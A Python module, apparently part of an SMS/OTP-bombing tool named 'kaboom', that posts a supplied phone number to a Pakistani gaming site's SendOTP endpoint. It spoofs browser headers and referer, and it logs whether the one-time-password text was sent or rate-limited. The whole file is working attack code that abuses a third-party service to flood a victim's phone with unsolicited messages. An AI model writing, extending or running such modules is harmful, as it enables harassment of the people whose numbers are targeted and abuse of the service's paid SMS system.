from kaboom.core import *
from kaboom.localuseragent import *

async def gamenow(phone, client, out):
    name = "gamenow"
    domain = "gamenow"
    frequent_rate_limit=False

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,pt;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'http://billingsocial.gamenow.com.pk',
        'Referer': 'http://billingsocial.gamenow.com.pk/UserSubscription/JzWifi?tname=JAZZGPL113&chAdnet=gpljazz6&tn=805067018981',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = {
        'Msisdn': f"{phone[-10:]}",
    }

    response = await client.post(
        'http://billingsocial.gamenow.com.pk/UserSubscription/SendOTP',
        headers=headers,
        data=data,

    )
    try:
        data=response.json()

        if data["status"] == True:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["status"] == False:
            message = str(data.get("message", "")).lower()
            is_rate_limited = "limit" in message or "try again" in message
            reason = data.get("message") or "otp request failed"
            if data.get("isjazzotp"):
                reason = f"{reason}; isjazzotp={data.get('isjazzotp')}"
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": is_rate_limited,"sent": False, "error": not is_rate_limited, "reason": reason})
            return None
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": False, "error": True, "reason": data.get("message") or "otp request failed"})
        return None
    except Exception as exc:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True, "reason": str(exc) or type(exc).__name__})
        return None
